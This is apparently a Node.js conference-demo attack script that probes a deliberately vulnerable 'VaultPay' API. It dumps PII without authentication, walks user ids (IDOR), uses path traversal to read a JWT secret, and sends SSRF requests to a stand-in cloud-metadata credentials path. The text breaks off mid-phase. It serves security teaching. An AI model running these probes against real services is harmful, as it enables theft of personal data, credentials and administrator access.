#!/usr/bin/env node
/**
 * VaultPay demo attacker — Short Conference Edition
 * =================================================
 *
 * Streamlined high-impact cut of attack.mjs for a ~10 minute slot:
 *   0. Reset (optional via --reset)
 *   1. Unauthenticated data theft (user dump / IDOR / search)
 *   2. Path traversal on /api/files (steals JWT_SECRET — the only secret theft)
 *   3. Open proxy / SSRF on /api/proxy (cloud edge vs app security)
 *   4. Authn ≠ authz: login, BOLA, admin route, cross-user write, mass assignment
 *   5. Login flood / rate limiting (after the login, so a lockout cannot hide phase 4)
 *   6. Forged admin JWT (climax) — then [Enter] before the report
 *
 * Works against any VaultPay build (Express in server/, DaloyJS in server-daloy/).
 * Every probe ends in one of three observed outcomes:
 *   ✗ APP HOLE   the attack worked
 *   ◐ REDUCED    the hole is still open but there was less to steal
 *   ✓ BLOCKED    the server refused the probe
 * The script only reports what it sees on the wire; it never assumes a framework.
 *
 * Dropped vs attack.mjs: the /api/debug/config beat in data theft (same secret
 * as the traversal) and the cloud-metadata (IMDS) probe (up to 8s of dead air,
 * inconclusive on Workers/Vercel). Run attack.mjs for the full 16-phase version.
 *
 * Usage:
 *   node --no-warnings attack/attackv2.mjs <API_BASE_URL> --drama --projector --reset
 *   node --no-warnings attack/attackv2.mjs https://vaultpay-api.devlinduldulao.workers.dev --drama --projector --reset
 *
 * Flags:
 *   --drama       wait for Enter between phases (stage pacing)
 *   --projector   high-contrast colors, trimmed wire traces, spacious layout
 *   --reset       POST /api/demo/reset before attack (cleans warm isolates)
 *   --quiet       minimal output
 *   --verbose     show response payloads
 *   --json        machine-readable output at the end
 *   --skip-flood  skip concurrent login flood
 *   --gate=TOKEN  send X-VaultPay-Demo header
 *   --internal=URL base URL for SSRF stand-in
 *   --label=NAME  name of the stack under attack (default: read from /api/health)
 */

import { createHmac } from "node:crypto";
import readline from "node:readline/promises";
import { stdin as input, stdout as output } from "node:process";

const rawArgs = process.argv.slice(2);
const flags = new Set(rawArgs.filter((a) => a.startsWith("--") && !a.includes("=")));
const positional = rawArgs.filter((a) => !a.startsWith("--"));
const targetArg = positional[0];

const quiet = flags.has("--quiet");
const verbose = flags.has("--verbose");
const drama = flags.has("--drama");
const projector = flags.has("--projector");
const asJson = flags.has("--json");
const skipFlood = flags.has("--skip-flood");
const doReset = flags.has("--reset");

/** Optional shared secret for gated public demos (server DEMO_GATE_TOKEN). */
let gateToken = process.env.DEMO_GATE_TOKEN || "";
let resetToken = process.env.DEMO_RESET_TOKEN || "";
/** SSRF stand-in target the API can reach but the attacker cannot. */
let internalService = process.env.INTERNAL_SERVICE_URL || "";
/** Name of the stack under attack, shown in the banner and report. */
let targetLabel = "";
for (const a of rawArgs) {
    if (a.startsWith("--label=")) targetLabel = a.slice("--label=".length);
    if (a.startsWith("--gate=")) gateToken = a.slice("--gate=".length);
    if (a.startsWith("--reset-token=")) resetToken = a.slice("--reset-token=".length);
    if (a.startsWith("--internal=")) internalService = a.slice("--internal=".length);
}
internalService = internalService.replace(/\/$/, "");

// Wire logging is ON by default for talks; --quiet turns it off.
// --projector keeps findings readable but trims per-request wire noise.
const showWire = !quiet && !projector;

if (!targetArg) {
    console.error(
        "Usage: node attackv2.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--projector] [--json] [--skip-flood] [--reset] [--gate=TOKEN] [--internal=URL] [--label=NAME]"
    );
    process.exit(2);
}

const BASE = targetArg.replace(/\/$/, "");
let baseUrl;
try {
    baseUrl = new URL(BASE);
} catch {
    console.error(`Invalid URL: ${targetArg}`);
    process.exit(2);
}

// ---------------------------------------------------------------------------
// Colors + console helpers (crafted for high contrast in dark & light terminals)
// ---------------------------------------------------------------------------
const isTTY = process.stdout.isTTY && !quiet;
const supports256 = isTTY && (typeof process.stdout.hasColors === "function" ? process.stdout.hasColors(256) : true);

// Dim gray that works on both dark (black) and light (white) background themes:
const dimCode = projector ? "" : isTTY ? (supports256 ? "\x1b[38;5;245m" : "\x1b[2m") : "";

const c = {
    reset: isTTY ? "\x1b[0m" : "",
    bold: isTTY ? "\x1b[1m" : "",
    dim: dimCode,
    red: isTTY ? (supports256 ? "\x1b[38;5;203m" : "\x1b[91m") : "",
    green: isTTY ? (supports256 ? "\x1b[38;5;40m" : "\x1b[92m") : "",
    yellow: isTTY ? (supports256 ? "\x1b[38;5;208m" : "\x1b[93m") : "",
    blue: isTTY ? (supports256 ? "\x1b[38;5;39m" : "\x1b[94m") : "",
    magenta: isTTY ? (supports256 ? "\x1b[38;5;171m" : "\x1b[95m") : "",
    cyan: isTTY ? (supports256 ? "\x1b[38;5;38m" : "\x1b[96m") : "",
    white: isTTY ? (supports256 ? "\x1b[38;5;231m" : "\x1b[97m") : "",
    bgRed: isTTY ? (supports256 ? "\x1b[48;5;196m" : "\x1b[41m") : "",
    bgGreen: isTTY ? (supports256 ? "\x1b[48;5;34m" : "\x1b[42m") : "",
    bgYellow: isTTY ? (supports256 ? "\x1b[48;5;208m" : "\x1b[43m") : "",
    bgBlue: isTTY ? (supports256 ? "\x1b[48;5;33m" : "\x1b[44m") : "",
    bgMagenta: isTTY ? (supports256 ? "\x1b[48;5;127m" : "\x1b[45m") : "",
};

const startedAt = Date.now();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * Stage pacing: --drama waits for Enter between phases so you can talk over a frozen screen.
 */
const dramaPause = async () => {
    if (!drama) return;
    if (!input.isTTY) {
        await sleep(400);
        return;
    }
    const rl = readline.createInterface({ input, output });
    try {
        await rl.question(`  ${c.dim}[Enter] continue…${c.reset} `);
    } finally {
        rl.close();
    }
};

function banner() {
    console.log(`
${c.red}${c.bold}╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ██████╗ ███████╗███╗   ███╗ ██████╗                                ║
║   ██╔══██╗██╔════╝████╗ ████║██╔═══██╗                               ║
║   ██║  ██║█████╗  ██╔████╔██║██║   ██║                               ║
║   ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║                               ║
║   ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝                               ║
║   ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝                                ║
║                                                                      ║
║   JWT ≠ Secure API   ·   Conference Short Edition                    ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
    console.log(`${c.bold}Target${c.reset}   ${c.cyan}${BASE}${c.reset}`);
    if (targetLabel) console.log(`${c.bold}Stack${c.reset}    ${c.bold}${c.yellow}${targetLabel}${c.reset}`);
    console.log(`${c.bold}Started${c.reset}  ${new Date().toISOString()}`);
    console.log(
        `${c.bold}Claim${c.reset}    JWT authenticates signed claims.\n         Authorization and safe app behavior still need explicit controls.`
    );
    console.log(
        `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "Enter" : "off"}  projector=${projector ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  reset=${doReset ? "on" : "off"}  gate=${gateToken ? "on" : "off"}  internal=${internalService || "none"}`
    );
    if (process.env.NODE_TLS_REJECT_UNAUTHORIZED === "0") {
        console.log(
            `${c.yellow}${c.bold}TLS${c.reset}     NODE_TLS_REJECT_UNAUTHORIZED=0 (corporate MITM / Zscaler — demo laptop only)`
        );
    }
    console.log(
        `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◐ REDUCED${c.reset}${c.dim}  ${c.green}✓ BLOCKED${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}\n`
    );
}

let phaseNo = 0;

function step(title) {
    phaseNo += 1;
    const n = String(phaseNo).padStart(2, "0");
    if (projector) console.log("");
    console.log(
        `\n${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
    );
    console.log(`${c.bold}${c.magenta}  PHASE ${n}  ·  ${title}${c.reset}`);
    console.log(
        `${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
    );
    if (projector) console.log("");
}

function intent(msg) {
    console.log(`  ${c.bgBlue}${c.white}${c.bold} WHY  ${c.reset} ${msg}`);
}

function narrate(msg) {
    console.log(`  ${c.cyan}»${c.reset} ${msg}`);
}

function ok(msg) {
    console.log(`  ${c.green}✓ OK${c.reset}             ${msg}`);
}

function bad(msg) {
    console.log(`  ${c.red}✗ APP HOLE${c.reset}       ${msg}`);
}

/** The hole is still open, but the response carried less than the attack wanted. */
function reduced(probe, msg) {
    stolen.reduced.push(msg);
    setOutcome(probe, "reduced", msg);
    console.log(`  ${c.yellow}${c.bold}◐ REDUCED${c.reset}        ${msg}`);
}

/** The server refused the probe outright. */
function blocked(probe, msg) {
    stolen.blocked.push(msg);
    setOutcome(probe, "blocked", msg);
    console.log(`  ${c.green}${c.bold}✓ BLOCKED${c.reset}        ${msg}`);
}

function platform(msg) {
    console.log(`  ${c.yellow}◇ PLATFORM${c.reset}       ${msg}`);
}

function info(msg) {
    console.log(`  ${c.dim}· ${msg}${c.reset}`);
}

function loot(label, value) {
    const raw = String(value ?? "");
    const max = projector ? 96 : 200;
    const v = raw.length > max ? raw.slice(0, max) + "…" : raw;
    console.log(
        `  ${c.bgRed}${c.white}${c.bold} LOOT ${c.reset} ${c.yellow}${c.bold}${label}${c.reset}  ${v}`
    );
}

function finding(severity, title, meta = {}) {
    const colors = {
        CRITICAL: c.red,
        HIGH: c.yellow,
        MEDIUM: c.blue,
        INFO: c.dim,
    };
    const color = colors[severity] || c.white;
    const owasp = meta.owasp ? ` ${c.dim}[${meta.owasp}:2023]${c.reset}` : "";
    const cwe = meta.cwe ? ` ${c.dim}[${meta.cwe}]${c.reset}` : "";
    const kind = meta.kind ? ` ${c.dim}(${meta.kind})${c.reset}` : "";
    console.log(`  ${color}${c.bold}[${severity}]${c.reset}${owasp}${cwe}${kind} ${title}`);
}

function scoreboard() {
    const by = stolen.findings.reduce((m, f) => {
        m[f.severity] = (m[f.severity] || 0) + 1;
        return m;
    }, {});
    const crit = by.CRITICAL || 0;
    const high = by.HIGH || 0;
    const med = by.MEDIUM || 0;
    const infoN = by.INFO || 0;
    if (projector) {
        const defended =
            (stolen.blocked.length ? ` · ${c.green}${stolen.blocked.length} blocked${c.reset}` : "") +
            (stolen.reduced.length ? ` · ${c.yellow}${stolen.reduced.length} reduced${c.reset}` : "");
        console.log(
            `  ── ${c.red}${crit} critical${c.reset} · ${c.yellow}${high} high${c.reset}${med ? ` · ${c.blue}${med} medium${c.reset}` : ""}${defended} · loot: users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}`
        );
        return;
    }
    console.log(
        `  ${c.dim}── scoreboard (cumulative finding records): ${c.red}${crit} critical${c.dim} · ${c.yellow}${high} high${c.dim} · ${c.blue}${med} medium${c.dim} · ${infoN} info · loot users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}${c.reset}`
    );
}

function previewBody(text, max = verbose ? 400 : 160) {
    if (!text) return "(empty)";
    const one = text.replace(/\s+/g, " ").trim();
    return one.length > max ? one.slice(0, max) + "…" : one;
}

function formatAuth(headers = {}) {
    const a = headers.Authorization || headers.authorization;
    if (!a) return "none";
    if (a.length <= 28) return a;
    return a.slice(0, 22) + "…" + a.slice(-8);
}

function statusColor(status) {
    if (status >= 200 && status < 300) return c.green;
    if (status >= 300 && status < 400) return c.yellow;
    if (status >= 400 && status < 500) return c.yellow;
    if (status >= 500) return c.red;
    return c.dim;
}

// ---------------------------------------------------------------------------
// HTTP with talk-friendly wire logs
// ---------------------------------------------------------------------------
let reqSeq = 0;

/**
 * @param {string} method
 * @param {string} path
 * @param {{ headers?: Record<string,string>, body?: unknown, timeoutMs?: number, label?: string, silent?: boolean }} [opts]
 */
async function http(method, path, opts = {}) {
    const {
        headers = {},
        body,
        timeoutMs = 15_000,
        label,
        silent = false,
    } = opts;

    const id = ++reqSeq;
    const payload = body !== undefined ? JSON.stringify(body) : undefined;
    const bytes = payload ? Buffer.byteLength(payload) : 0;

    if (showWire && !silent) {
        const tag = label ? ` ${c.dim}(${label})${c.reset}` : "";
        console.log(
            `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${id}${c.reset}${tag}  ${c.bold}${method}${c.reset} ${c.cyan}${path}${c.reset}`
        );
        console.log(
            `           ${c.dim}auth=${formatAuth(headers)}  body=${bytes ? bytes + " B" : "—"}  timeout=${timeoutMs}ms${c.reset}`
        );
        if (verbose && body && bytes < 2_000) {
            console.log(`           ${c.dim}json=${previewBody(JSON.stringify(body), 280)}${c.reset}`);
        } else if (verbose && body && bytes >= 2_000) {
            console.log(`           ${c.dim}json=(oversized payload, ${bytes} bytes)${c.reset}`);
        }
    }

    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    const t0 = Date.now();
    try {
        const send = () =>
            fetch(`${BASE}${path}`, {
                method,
                headers: {
                    Accept: "application/json, text/plain, */*",
                    ...(payload !== undefined ? { "Content-Type": "application/json" } : {}),
                    ...(gateToken ? { "X-VaultPay-Demo": gateToken } : {}),
                    ...headers,
                },
                body: payload,
                redirect: "manual",
                signal: ctrl.signal,
            });
        let res;
        try {
            res = await send();
        } catch (err) {
            // One retry for a dropped keep-alive socket (e.g. after the server closed on a 413). Never for timeouts or writes.
            if (method !== "GET" || err.name === "AbortError" || err.name === "TimeoutError") throw err;
            res = await send();
        }
        const text = await res.text();
        const ms = Date.now() - t0;
        let json = null;
        try {
            json = JSON.parse(text);
        } catch {
            /* not json */
        }
        const headerObj = {};
        res.headers.forEach((v, k) => {
            headerObj[k.toLowerCase()] = v;
        });

        if (showWire && !silent) {
            const sc = statusColor(res.status);
            console.log(
                `  ${c.green}${c.bold}← RECV${c.reset}  ${c.bold}#${id}${c.reset}  ${sc}${c.bold}${res.status}${c.reset}  ${c.dim}${ms}ms  ${text.length} B${c.reset}`
            );
            if (headerObj.location) {
                console.log(`           ${c.dim}Location: ${headerObj.location}${c.reset}`);
            }
            if (verbose || res.status >= 500 || (json && (json.error || json.jwtSecret || json.stack))) {
                console.log(`           ${c.dim}body: ${previewBody(text)}${c.reset}`);
            } else if (showWire && text && text.length < 120) {
                console.log(`           ${c.dim}body: ${previewBody(text, 120)}${c.reset}`);
            }
        }

        return { status: res.status, headers: headerObj, text, json, ms, id };
    } catch (err) {
        const ms = Date.now() - t0;
        if (showWire && !silent) {
            console.log(
                `  ${c.red}${c.bold}← FAIL${c.reset}  ${c.bold}#${id}${c.reset}  ${c.red}${err.message}${c.reset}  ${c.dim}${ms}ms${c.reset}`
            );
        }
        throw err;
    } finally {
        clearTimeout(timer);
    }
}

function b64url(input) {
    return Buffer.from(input)
        .toString("base64")
        .replace(/=/g, "")
        .replace(/\+/g, "-")
        .replace(/\//g, "_");
}

function signHs256(payloadObj, secret) {
    const header = b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }));
    const payload = b64url(JSON.stringify(payloadObj));
    const data = `${header}.${payload}`;
    const sig = createHmac("sha256", secret)
        .update(data)
        .digest("base64")
        .replace(/=/g, "")
        .replace(/\+/g, "-")
        .replace(/\//g, "_");
    return `${data}.${sig}`;
}

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
const stolen = {
    users: [],
    orders: [],
    jwtSecret: null,
    token: null,
    loginUser: null,
    forgedAdminToken: null,
    escalated: false,
    findings: [],
    platformNotes: [],
    /** Messages for probes that worked only partly / were refused. */
    reduced: [],
    blocked: [],
    /** probe id → { state: "open"|"reduced"|"blocked"|"not-reached", severity?, note } */
    outcomes: {},
};

/**
 * One row per attack, in demo order. `npm run compare` prints these side by
 * side for each target. A probe with no recorded outcome was not reached.
 */
const PROBES = [
    ["user-dump", "User dump without a token (SSN/card/CVV)"],
    ["idor", "Read any user by id without a token"],
    ["search", "Unauthenticated PII search"],
    ["traversal", "Path traversal to the secrets folder"],
    ["ssrf", "SSRF: server fetches an internal URL"],
    ["bola", "Read every user's orders with one login"],
    ["admin", "Admin route with a non-admin token"],
    ["cross-write", "Edit another user's record"],
    ["mass-assign", "Mass-assign role=admin + balance"],
    ["flood", "40 wrong passwords in one burst"],
    ["forge", "Forge an admin JWT"],
];

function setOutcome(probe, state, note, severity) {
    if (!probe) return;
    const prev = stolen.outcomes[probe];
    // "reduced" is sticky: a lower-severity finding recorded after it must not turn it back into "open".
    if (prev?.state === "reduced" && state === "open") {
        prev.severity = severity;
        return;
    }
    stolen.outcomes[probe] = { state, note: note || "", ...(severity ? { severity } : {}) };
}

const SENSITIVE_FIELDS = ["ssn", "cardNumber", "cardCvv", "password", "passwordHash", "internalNote", "address"];

/** Which sensitive fields are present in these response rows? Observation only. */
function sensitiveFieldsIn(rows) {
    const present = new Set();
    for (const row of rows || []) {
        for (const f of SENSITIVE_FIELDS) if (row && row[f] !== undefined && row[f] !== null) present.add(f);
    }
    return [...present];
}

/** Short reason a server gave for refusing a request ({error} or RFC 9457 problem+json). */
function refusalReason(res) {
    const j = res.json || {};
    const first = Array.isArray(j.errors) && j.errors[0] ? j.errors[0].message : "";
    const msg = first || j.error || j.detail || j.title || "";
    return msg ? `: ${String(msg).replace(/\s+/g, " ").slice(0, 70)}` : "";
}

const isExpressTarget = () => /^express/i.test(targetLabel);

/** Ask the target what it is (one quiet request) and fail early if it is down. */
async function identifyTarget() {
    try {
        const h = await http("GET", "/api/health", { silent: true, timeoutMs: 6_000 });
        if (targetLabel) return;
        if (h.json?.framework) targetLabel = String(h.json.framework);
        else if (h.json?.express) targetLabel = `Express ${h.json.express}`;
    } catch (err) {
        console.error(`\n  Cannot reach ${BASE} (${err.message}).`);
        console.error("  Start the target first — e.g. `npm run server` (Express) or `npm run server:daloy`.\n");
        process.exit(1);
    }
}

function record(severity, title, detail, meta = {}) {
    const entry = {
        severity,
        title,
        detail,
        kind: meta.kind || "app-code",
        owasp: meta.owasp || null,
        cwe: meta.cwe || null,
        source: meta.source || "app",
    };
    stolen.findings.push(entry);
    setOutcome(meta.probe, "open", title, severity);
    finding(severity, title, entry);
    if (detail && !projector) info(detail);
    scoreboard();
}

function notePlatform(title, detail) {
    stolen.platformNotes.push({ title, detail });
    platform(title);
    if (detail) info(detail);
}

// ---------------------------------------------------------------------------
// Selected high-impact phases (attack.mjs phases 12, 07, 09, 06, 16 — 16 split in two)
// ---------------------------------------------------------------------------

/**
 * RESET · Demo reset — re-seed in-memory state (only when --reset)
 */
async function phaseReset() {
    if (!doReset) return;
    step("Demo reset — re-seed in-memory state");
    intent("Warm Worker/serverless isolates keep prior LOOT (Hijacked Bob). Reset before the reveal.");
    const res = await http("POST", "/api/demo/reset", {
        label: "demo-reset",
        headers: resetToken ? { "X-VaultPay-Reset": resetToken } : {},
    });
    if (res.status === 200 && res.json?.ok) {
        // Serverless hosts keep several warm instances, each with its own in-memory DB.
        // One reset only cleans the instance that answered, so check and repeat.
        let extra = 0;
        for (; extra < 8; extra++) {
            const check = await http("GET", "/api/users", { silent: true }).catch(() => null);
            const seed = (check?.json?.users || []).filter((u) => u.id === 1 || u.id === 2);
            const dirty = seed.some((u) => /^Hijacked/.test(u.name || "") || u.role === "admin");
            if (!dirty) break;
            await http("POST", "/api/demo/reset", {
                silent: true,
                headers: resetToken ? { "X-VaultPay-Reset": resetToken } : {},
            }).catch(() => null);
        }
        ok(
            extra
                ? `Demo DB re-seeded (Alice/Bob/admin clean; ${extra} extra reset(s) for other warm instances)`
                : "Demo DB re-seeded (Alice/Bob/admin clean)"
        );
    } else {
        info(`Reset → ${res.status} (DEMO_RESET_TOKEN may be required)`);
    }
}

/**
 * Unauthenticated data theft (users / IDOR / search) — attack.mjs phase 12 minus the debug beat
 */
async function phaseUnauthDataTheft() {
    step("Unauthenticated data theft (users / IDOR / search)");
    intent("No password, no token — full PII (personally identifiable information). Authn was never applied.");

    narrate("Dumping /api/users with zero Authorization header…");
    const usersRes = await http("GET", "/api/users", { label: "user-dump" });
    if (usersRes.status === 200 && Array.isArray(usersRes.json?.users)) {
        stolen.users = usersRes.json.users;
        if (sensitiveFieldsIn(stolen.users).length) {
            bad(`Returned ${stolen.users.length} full accounts without auth`);
            for (const u of stolen.users) {
                loot(
                    `#${u.id} ${u.email}`,
                    `role=${u.role} ssn=${u.ssn} card=${u.cardNumber} cvv=${u.cardCvv}`
                );
            }
            record(
                "CRITICAL",
                "Unauthenticated user dump",
                "No auth middleware on collection route — app left it public",
                { kind: "app-code", owasp: "API5", probe: "user-dump" }
            );
        } else {
            bad(`Returned ${stolen.users.length} accounts without auth — the route is still public`);
            for (const u of stolen.users) {
                loot(`#${u.id} ${u.email}`, `role=${u.role}  (fields: ${Object.keys(u).join(", ")})`);
            }
            reduced("user-dump", "No SSN, card number or CVV anywhere in the response");
            record(
                "MEDIUM",
                "Unauthenticated user list (no sensitive fields)",
                "Names, emails and roles are readable without a token; SSN / card / CVV are not in the response.",
                { kind: "app-code", owasp: "API5", probe: "user-dump" }
            );
        }
    } else {
        blocked("user-dump", `GET /api/users without a token → ${usersRes.status}${refusalReason(usersRes)}`);
    }

    const id = stolen.users[0]?.id ?? 1;
    narrate(`IDOR (Insecure Direct Object Reference): fetch /api/users/${id} still without auth…`);
    const one = await http("GET", `/api/users/${id}`, { label: "idor-user" });
    const oneUser = one.status === 200 ? one.json?.user : null;
    if (oneUser && sensitiveFieldsIn([oneUser]).length) {
        bad(`Full record for user #${id} — just by changing the id`);
        loot("SSN", oneUser.ssn);
        loot("card", oneUser.cardNumber);
        loot("CVV", oneUser.cardCvv);
        loot("note", oneUser.internalNote);
        record(
            "CRITICAL",
            "IDOR on /api/users/:id without auth",
            "Walk the id space — no auth, no ownership check",
            { kind: "app-code", owasp: "API1", probe: "idor" }
        );
    } else if (oneUser) {
        bad(`User #${id} readable by id without auth`);
        reduced("idor", "No SSN, card, CVV or internal note in that record either");
        record(
            "MEDIUM",
            "Unauthenticated read of any user by id (no sensitive fields)",
            "Walk the id space — no auth, no ownership check; the response carries public profile fields only.",
            { kind: "app-code", owasp: "API1", probe: "idor" }
        );
    } else {
        blocked("idor", `GET /api/users/${id} without a token → ${one.status}${refusalReason(one)}`);
    }

    narrate('Searching PII with q="oslo"…');
    const search = await http("GET", "/api/search?q=oslo", { label: "pii-search" });
    const hits = search.status === 200 ? search.json?.results || [] : [];
    if (hits.length > 0 && sensitiveFieldsIn(hits).length) {
        bad(`Search returned ${hits.length} PII hits without auth`);
        for (const r of hits) {
            loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
        }
        record(
            "HIGH",
            "Unauthenticated PII search",
            "Search exposes sensitive object properties without filtering (API3), and lacks function access control (also API5).",
            { kind: "app-code", owasp: "API3", probe: "search" }
        );
    } else if (hits.length > 0) {
        bad(`Search matched ${hits.length} users on a field it does not return — still no auth`);
        for (const r of hits) loot(r.email, r.name);
        reduced("search", "No address or SSN in the results — the match is only a yes/no oracle");
        record(
            "MEDIUM",
            "Unauthenticated user search (no sensitive fields returned)",
            "Search still filters on hidden fields, so it answers yes/no questions about them; the response carries public profile fields only.",
            { kind: "app-code", owasp: "API5", probe: "search" }
        );
    } else if (search.status === 200) {
        info("Search returned no results");
    } else {
        blocked("search", `GET /api/search without a token → ${search.status}${refusalReason(search)}`);
    }
}

/**
 * PHASE 07 · Path traversal on /api/files (no login)
 */
async function phasePathTraversal() {
    step("Path traversal on /api/files (no login)");
    intent("A file endpoint that takes a name from the query string. Can we climb out of the public folder?");
    narrate("First, read the intended public file…");
    const legit = await http("GET", "/api/files?name=welcome.txt", { label: "legit-file" });
    if (legit.status === 200 && /Welcome to VaultPay/i.test(legit.text)) {
        ok("welcome.txt is readable (expected)");
    } else {
        info(`welcome.txt → ${legit.status}`);
    }

    narrate("Now walk up directories into data/secrets/…");
    const attempts = ["../secrets/jwt-backup.txt", "..\\secrets\\jwt-backup.txt"];
    let hit = null;
    const statuses = new Set();
    for (const t of attempts) {
        const res = await http("GET", `/api/files?name=${encodeURIComponent(t).replace(/%2F/gi, "/")}`, {
            label: `traverse:${t}`,
        });
        statuses.add(res.status);
        if (res.status === 200 && /JWT_SECRET=/.test(res.text)) {
            hit = { t, body: res.text };
            break;
        }
        const res2 = await http("GET", `/api/files?name=${t}`, { label: `traverse-raw:${t}` });
        statuses.add(res2.status);
        if (res2.status === 200 && /JWT_SECRET=/.test(res2.text)) {
            hit = { t, body: res2.text };
            break;
        }
    }

    if (hit) {
        bad(`Path traversal succeeded with name=${hit.t}`);
        loot("secret-file", hit.body.replace(/\s+/g, " ").trim());
        const m = /JWT_SECRET=(\S+)/.exec(hit.body);
        if (m) {
            stolen.jwtSecret = stolen.jwtSecret || m[1];
            loot("JWT_SECRET", stolen.jwtSecret);
        }
        record(
            "CRITICAL",
            "Path traversal exposes virtual secret-file contents",
            "Demo in-memory VFS joins input without containment; no disk files were read. The hard-coded backup key may differ from the active signing key; JWT acceptance is tested separately.",
            { kind: "app-code", cwe: "CWE-22", probe: "traversal" }
        );
    } else {
        blocked("traversal", `Every ../ attempt was refused (${[...statuses].join(" / ")}) — nothing outside the public folder`);
    }
}

async function probeInternalPivot(opts = { proxyAlive: true }) {
    if (!internalService) return;
    if (!opts.proxyAlive) {
        info("Skipping internal-pivot probe — open proxy endpoint not available");
        return;
    }

    const credsPath = "/latest/meta-data/iam/security-credentials/vaultpay-demo-role";
    const internalUrl = `${internalService}${credsPath}`;

    narrate(`Reachability check: can WE fetch the same stand-in resource directly?`);
    let attackerReach = false;
    try {
        const direct = await fetch(internalUrl, {
            signal: AbortSignal.timeout(2500),
        });
        attackerReach = direct.ok;
    } catch {
        attackerReach = false;
    }
    if (attackerReach) {
        info("Laptop run: attacker and API share a host, so this service is reachable from here too");
        info("This run does not demonstrate a private-network boundary; the credentials are fabricated demo data");
    } else {
        info("Direct client fetch failed; this alone does not prove the service is internal-only");
    }

    narrate(`Asking the SERVER to fetch it instead: ${internalUrl}`);
    const pivot = await http("GET", `/api/proxy?url=${encodeURIComponent(internalUrl)}`, {
        timeoutMs: 8_000,
        label: "ssrf-internal",
    });
    const body = (pivot.text || "").replace(/\s+/g, " ").trim();
    if (pivot.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(body)) {
        bad("Server fetched the separate metadata stand-in and returned fabricated credentials");
        loot("internal-creds", body.slice(0, 180));
        record(
            "HIGH",
            "SSRF fetches metadata stand-in credentials",
            `Fabricated credentials from the separate demo service, not real IAM credentials. Direct client fetch ${attackerReach ? "also succeeded; no private-network boundary demonstrated" : "failed; network isolation remains unconfirmed"}.`,
            { kind: "app-code", owasp: "API7", probe: "ssrf" }
        );
    } else {
        info(`Internal pivot → ${pivot.status} ${body.slice(0, 80)}`);
    }

    narrate("Now test redirect following within the same stand-in service (not an allowlist bypass)…");
    const hopUrl = `${internalService}/redirect?to=${encodeURIComponent(credsPath)}`;
    const hop = await http("GET", `/api/proxy?url=${encodeURIComponent(hopUrl)}`, {
        timeoutMs: 8_000,
        label: "ssrf-redirect-hop",
    });
    const hopBody = (hop.text || "").replace(/\s+/g, " ").trim();
    if (hop.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(hopBody)) {
        bad("Proxy followed the stand-in redirect and returned fabricated credentials");
        loot("hop-creds", hopBody.slice(0, 140));
        info("Additional evidence for the same proxy flaw; no new finding or allowlist bypass counted. Production SSRF defenses must validate every destination or disable redirects.");
    } else {
        info(`Redirect-hop probe → ${hop.status}`);
    }
}

/**
 * PHASE 09 · Open proxy / SSRF on /api/proxy (no login)
 */
async function phaseSsrfProxy() {
    step("Open proxy / SSRF on /api/proxy (no login)");
    intent(
        "The server fetches any URL we hand it. Does anything restrict where it will go?"
    );
    let proxyAlive = true;
    const loop = `${BASE}/api/debug/config`;
    narrate(`Asking the server to fetch its own debug config: ${loop}`);
    const res = await http("GET", `/api/proxy?url=${encodeURIComponent(loop)}`, {
        timeoutMs: 12_000,
        label: "ssrf-self",
    });
    if (res.status === 200 && /jwtSecret|supersecret/i.test(res.text)) {
        bad("Open proxy fetched own debug config and returned secrets");
        loot("ssrf-body", res.text.slice(0, 240));
        try {
            const j = JSON.parse(res.text);
            if (j.jwtSecret && stolen.jwtSecret) {
                info(`Signing secret again ("${j.jwtSecret}") — a second route to the same key`);
            } else if (j.jwtSecret) {
                stolen.jwtSecret = j.jwtSecret;
                loot("JWT_SECRET", stolen.jwtSecret);
            }
        } catch {
            /* ignore */
        }
        record(
            "CRITICAL",
            "SSRF proxy returns its public debug endpoint's secret",
            "Observed server-side self-fetch of the public BASE URL. This proves proxying the secret response, not access to an internal-only network destination.",
            { kind: "app-code", owasp: "API7", probe: "ssrf" }
        );
    } else if (res.status === 200) {
        bad(`Open proxy returned 200 for self-URL (body may vary)`);
        record("HIGH", "Open proxy endpoint exists", res.text.slice(0, 120), {
            kind: "app-code",
            owasp: "API7",
            probe: "ssrf",
        });
    } else if ([400, 403, 422].includes(res.status) && /ssrf|not allowed|refus|blocked|forbidden/i.test(res.text || "")) {
        blocked("ssrf", `Proxy refused to fetch its own host (${res.status}${refusalReason(res)})`);
        info("Only the internal destination was probed; public URLs were not tested in this run.");
    } else if (res.status === 404 && /error code:\s*1042/i.test(res.text || "")) {
        notePlatform(
            "Self-fetch blocked by Cloudflare (error 1042) — not app authz",
            "Workers often refuse same-origin/self subrequests. The /api/proxy hole may still work for other URLs."
        );
        const external = "https://example.com/";
